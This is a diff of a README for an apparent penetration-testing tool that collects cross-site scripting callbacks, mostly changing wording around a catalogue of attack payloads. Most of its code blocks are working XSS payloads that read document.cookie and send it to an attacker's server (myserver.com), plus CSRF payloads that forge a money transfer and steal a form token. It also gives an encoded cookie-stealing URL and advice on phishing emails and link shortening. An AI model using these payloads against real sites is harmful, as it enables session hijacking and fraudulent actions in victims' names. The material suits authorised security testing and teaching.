@@ -1,12 +1,12 @@
 # XSS Catcher
 
-PHP API for storing all incoming XSS requests and various XSS templates.
+PHP API for storing all incoming XSS requests. Also including various XSS templates.
 
-Incoming XSS request can have `data` (i.e. stolen data), `site`, `redirect`, and `info` HTTP request parameters.
+Incoming XSS request can have `data` (i.e., stolen data), `site`, `redirect`, and `info` HTTP request parameters.
 
-Use `redirect` with `<script src="https://myserver.com?redirect=xss.js"></script>` to both, store an XSS request and execute JavaScript code. Redirect file e.g. `xss.js` will resolve to the relative path on your web server, i.e. `./xss.js`.
+Use `<script src="https://myserver.com?redirect=xss.js"></script>` payload to both, store the incoming XSS request and execute additional JavaScript code specified in `xss.js` - where `xss.js` is equal to the relative path `./xss.js`.
 
-Play with the given examples and make your own (possibly shorter).
+Play with the given payloads and create your own, possibly shorter.
 
 Tested on XAMPP for Windows v7.4.3 (64-bit) with Chrome v92.0.4515.131 (64-bit) and Firefox v90.0.2 (64-bit).
 
@@ -32,7 +32,7 @@ Future plans:
 
 Import [\\db\\xss_catcher.sql](https://github.com/ivan-sincek/xss-catcher/blob/master/db/xss_catcher.sql) to your database server.
 
-Copy all the content from [\\src\\](https://github.com/ivan-sincek/xss-catcher/tree/master/src) to your server's web root directory (e.g. to \\xampp\\htdocs\\ on XAMPP).
+Copy all the content from [\\src\\](https://github.com/ivan-sincek/xss-catcher/tree/master/src) to your server's web root directory (e.g., to \\xampp\\htdocs\\ on XAMPP).
 
 Change the database settings inside [\\src\\php\\config.ini](https://github.com/ivan-sincek/xss-catcher/blob/master/src/php/config.ini) as necessary.
 
@@ -42,7 +42,7 @@ You can use [ngrok](https://ngrok.com) to give your web server a public address.
 
 ---
 
-If callback HTTP requests are being blocked, try setting the following cross-origin resource sharing \([CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)\) policy in your web server's configuration file; e.g. on XAMPP, edit `\conf\httpd.conf` from your Apache directory:
+If callback HTTP requests are being blocked, try setting the following cross-origin resource sharing \([CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)\) policy in your web server's configuration file; e.g., on XAMPP, edit `\conf\httpd.conf` from your Apache directory:
 
 ```fundamental
 <IfModule mod_headers.c>
@@ -53,9 +53,11 @@ If callback HTTP requests are being blocked, try setting the following cross-ori
 </IfModule>
 ```
 
-The same is already set in [\\src\\.htaccess](https://github.com/ivan-sincek/xss-catcher/blob/master/src/.htaccess), but depending on your web server's current configuration, it might be ignored.
+However, using the above policy, your web server will not be receiving any HTTP cookies in the `Cookie` HTTP request header; but, you can still send them in the `data` HTTP request parameter.
 
-Keep in mind that the following CORS policy cannot be used together:
+The above policy is already set in [\\src\\.htaccess](https://github.com/ivan-sincek/xss-catcher/blob/master/src/.htaccess), but depending on your web server's current configuration, it might be ignored or overriden.
+
+If you want cookies to be sent in the `Cookie` HTTP request header, keep in mind that the following CORS parameters CANNOT go together:
 
 ```fundamental
 Access-Control-Allow-Origin: *
@@ -75,11 +77,11 @@ Usually used to steal HTTP cookies or to modify a web page.
 
 ### XSS Types
 
-The most common type is the reflected XSS attack. It usually reflects malicious code only to the person who e.g. opens a malicious link.
+The most common type is the reflected XSS attack. It usually reflects malicious code only to the person who, e.g,. opens a malicious link.
 
-Stored XSS attack is when malicious code gets stored (i.e. saved) into e.g. a database table, file, etc. It usually reflects to every person who loads the infected table, file, etc.
+Stored XSS attack is when malicious code gets stored (i.e., saved) into, e.g., a database table, file, etc. It usually reflects to every person who loads the infected table, file, etc.
 
-DOM based XSS attack reflects malicious code only to the person who e.g. opens a malicious link; but, comapred to reflected XSS attack, it cannot modify the HTTP response.
+DOM based XSS attack reflects malicious code only to the person who, e.g., opens a malicious link; but, comapred to the reflected XSS attack, it cannot modify the HTTP response but only already loaded HTML content.
 
 ### XSS Injections
 
@@ -95,7 +97,7 @@ Simple cross-site-scripting (XSS) payloads:
 <img src="xxx" onerror="alert(1)">
 ```
 
-**To dump the HTML content of a hidden/inaccessible web page, just replace `document.cookie` with `document.body.innerHTML` in the following examples.**
+**To dump the HTML content of a hidden/inaccessible web page, simply replace `document.cookie` with `document.body.innerHTML` in the below payloads.**
 
 ---
 
@@ -109,11 +111,11 @@ Steal HTTP cookies by injecting the following JavaScript code:
 <script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://myserver.com', true); xhr.send('{\"site\": \"' + encodeURIComponent(location.hostname + location.pathname) + '\", \"data\": \"' + encodeURIComponent(document.cookie) + "\"}");</script>
 ```
 
-First example above will send an HTTP POST request to your server with user-defined parameters as a form-data. Opt for this example whenever possible.
+First payload above will send an HTTP POST request to your server with user-defined parameters as a form-data. Opt for this payload whenever possible.
 
 To send user-defined parameters as a form-data, you must add `Content-Type: application/x-www-form-urlencoded` HTTP request header.
 
-Second example above will send an HTTP POST request to your server with raw data encoded in JSON.
+Second payload above will send an HTTP POST request to your server with raw data encoded in JSON.
 
 ---
 
@@ -125,15 +127,15 @@ Steal HTTP cookies by injecting the following HTML code:
 <img src="https://github.com/favicon.ico" onload="this.src = 'https://myserver.com?site=' + encodeURIComponent(location.hostname) + location.pathname + '&data=' + encodeURIComponent(document.cookie);" hidden="hidden">
 ```
 
-First example above will send an HTTP POST request to your server with user-defined parameters as a form-data.
+First payload above will send an HTTP POST request to your server with user-defined parameters as a form-data.
 
-Second example above will send an HTTP GET request to your server with user-defined parameters in a query string (i.e. in a URL).
+Second payload above will send an HTTP GET request to your server with user-defined parameters in a query string (i.e., in a URL).
 
 ## Cross-Site Request Forgery (CSRF)
 
-Not necessarily used to steal HTTP cookies or to modify a web page. The goal is to just execute a forged query in the name of an already signed-in user.
+Not necessarily used to steal HTTP cookies or to modify a web page. The goal is to just execute a forged query in the name/session/context of an already signed-in user.
 
-The simplest way to do so, is to send aphishing email containing a link such as `https://target.com/transfer.php?recipient=eve&amount=9000` (limited to HTTP GET request) to the victim or to store/hide a malicious code in either your target's website or your own website, and then send the less suspicious link.
+The simplest way to do so, is to send a phishing email containing a link such as `https://target.com/transfer.php?recipient=eve&amount=9000` (limited to HTTP GET request) to the victim or to store/hide a malicious code in either your target's website or your own website, and then send the less suspicious link.
 
 **Try to figure out what kind of data does a backend server accept before you try to forge/send anything. Is it a query string, form-data, raw data encoded in JSON, etc.?**
 
@@ -165,7 +167,7 @@ Plant a forged request by injecting the following JavaScript code:
 <script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://target.com/transfer.php', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('recipient=eve&amount=9000');</script>
 ```
 
-Example above will send an HTTP POST request to a target server in the victim's name with user-defined parameters as a form-data.
+Payload above will send an HTTP POST request to a target server in the victim's name with user-defined parameters as a form-data.
 
 ---
 
@@ -177,9 +179,9 @@ Plant a forged request whilst stealing a web form token by injecting the followi
 <script>window.onload = function() { var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://target.com/transfer.php?recipient=eve&amount=9000&token=' + encodeURIComponent(document.getElementsByName('token')[0].value), true); xhr.send(); }</script>
 ```
 
-First example above will send an HTTP POST request to a target server in the victim's name with user-defined parameters as a form-data.
+First payload above will send an HTTP POST request to a target server in the victim's name with user-defined parameters as a form-data.
 
-Second example above will send an HTTP GET request to a target server in the victim's name with user-defined parameters in a query string (i.e. in a URL).
+Second payload above will send an HTTP GET request to a target server in the victim's name with user-defined parameters in a query string (i.e., in a URL).
 
 **To steal a web form token or any other web form data, you must wait for the web form to fully render/load. You can do that by calling the `window.onload` event.**
 
@@ -193,7 +195,7 @@ Plant a forged request by injecting the following HTML code:
 <img src="https://github.com/favicon.ico" alt="csrf" style="background-image: url('https://target.com/transfer.php?recipient=eve&amount=9000');" hidden="hidden">
 ```
 
-Both examples above will send an HTTP GET request to a target server in the victim's name with user-defined parameters in a query string (i.e. in a URL).
+Both payloads above will send an HTTP GET request to a target server in the victim's name with user-defined parameters in a query string (i.e., in a URL).
 
 ---
 
@@ -203,11 +205,11 @@ Plant a forged request by injecting the following CSS code:
 <style>div { background-image: url('https://target.com/transfer.php?recipient=eve&amount=9000'); }</style>
 ```
 
-Example above will send an HTTP GET request to a target server in the victim's name with user-defined parameters in a query string (i.e. in a URL).
+Payload above will send an HTTP GET request to a target server in the victim's name with user-defined parameters in a query string (i.e., in a URL).
 
 ### CSRF Templates
 
-Copy all the content from [\\templates\\](https://github.com/ivan-sincek/xss-catcher/tree/master/templates) to your server's web root directory (e.g. to \\xampp\\htdocs\\ on XAMPP).
+Copy all the content from [\\templates\\](https://github.com/ivan-sincek/xss-catcher/tree/master/templates) to your server's web root directory (e.g., to \\xampp\\htdocs\\ on XAMPP).
 
 You can also use this simple Python3 one-liner to start a local web server from a specified directory:
 
@@ -253,7 +255,7 @@ Final XSS request:
 https://localhost/welcome.php?language=en%27%3B%20var%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%20xhr.open%28%27POST%27%2C%20%27https%3A%2F%2Fmyserver.com%27%2C%20true%29%3B%20xhr.setRequestHeader%28%27Content-Type%27%2C%20%27application%2Fx-www-form-urlencoded%27%29%3B%20xhr.send%28%27site%3D%27%20%2B%20encodeURIComponent%28location.hostname%20%2B%20location.pathname%29%20%2B%20%27%26data%3D%27%20%2B%20encodeURIComponent%28document.cookie%29%29%3B%20var%20test%20%3D%20%27
 ```
 
-\[OPTIONAL\] Shorten your query string (i.e. URL) with [Bitly](https://bitly.com).
+\[OPTIONAL\] Shorten your query string (i.e., URL) with [Bitly](https://bitly.com).
 
 Solution (output escaping):
 
